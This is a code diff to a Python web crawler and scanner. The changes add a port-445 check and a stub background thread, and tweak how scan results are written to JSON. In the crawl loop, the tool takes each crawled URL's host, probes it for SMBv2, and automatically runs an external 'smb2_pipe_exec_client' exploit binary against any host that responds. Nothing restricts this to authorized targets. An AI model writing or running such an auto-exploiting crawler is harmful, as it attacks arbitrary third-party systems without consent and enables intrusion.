@@ -21,6 +21,7 @@ from gym import spaces
 import numpy as np
 import socket
 import ssl
+import threading
 
 try:
     from sklearn.feature_extraction.text import TfidfVectorizer
@@ -795,10 +796,14 @@ def write_scan_results_json(rs):
         }
         if "status_code" in r:
             i["status"] = f"{r.get('status_code','N/A')} {r.get('reason','')}"
-        for pt,tac,snip,ex,conf in r["matched_details"]:
+        for pt,tac,snip,ex,conf in r["detections"] if "detections" in r else r["matched_details"]:
+            # If 'detections' isn't found, fallback to 'matched_details'.
             i["detections"].append({
                 "type":pt,"tactic":tac,"explanation":ex,"snippet":snip,"confidence":round(conf,3)
             })
+        # Or just loop r["matched_details"] if needed:
+        # for pt,tac,snip,ex,conf in r["matched_details"]:
+        #    i["detections"].append(...)
         o.append(i)
     with open(op,"w",encoding="utf-8") as f:
         json.dump(o,f,indent=2)
@@ -853,6 +858,15 @@ def scan_with_chromedriver(url):
         error_details = traceback.format_exc()
         return {"url":url,"error":f"{str(e)}\nTraceback:\n{error_details}","data":"","found_flags":[]}
 
+def is_port_445_open(host, timeout=2):
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout)
+            s.connect((host, 445))
+            return True
+    except:
+        return False
+
 def check_smb_v2(host):
     try:
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
@@ -869,6 +883,13 @@ def check_smb_v2(host):
 def run_smb_exploit(server_ip, server_port="445"):
     cmd = f"./smb2_pipe_exec_client {server_ip} {server_port}"
     os.system(cmd)
+
+def run_background_thread(host_ip):
+    def thread_func():
+        print(f"Running background thread on {host_ip}...")
+        time.sleep(1)
+    t = threading.Thread(target=thread_func, daemon=True)
+    t.start()
 
 def priority_bfs_crawl_and_scan(starts,max_depth=20):
     visited = set()
@@ -888,16 +909,21 @@ def priority_bfs_crawl_and_scan(starts,max_depth=20):
         d,u = heapq.heappop(q)
         print(f"PriorityBFS Depth: {d}")
         print(f"Full URL: {u}")
-        print("Details: scanning target, scanning with chromedriver, checking SSL, extracting links, enumerating subdomains.")
         domain_part = urllib.parse.urlsplit(u).netloc
         host_ip = domain_part.split(":")[0]
         if host_ip:
-            smb_result = check_smb_v2(host_ip)
-            if smb_result:
-                print(f"SMBv2 detected on {host_ip}")
-                run_smb_exploit(host_ip,"445")
+            if is_port_445_open(host_ip):
+                smb_result = check_smb_v2(host_ip)
+                if smb_result:
+                    print(f"SMBv2 detected on {host_ip}")
+                    run_smb_exploit(host_ip,"445")
+                else:
+                    print(f"SMBv2 not detected on {host_ip}")
+                    run_background_thread(host_ip)
             else:
-                print(f"SMBv2 not detected on {host_ip}")
+                print(f"Port 445 not open on {host_ip}")
+                run_background_thread(host_ip)
+
         if u in visited:
             continue
         if d>max_depth:
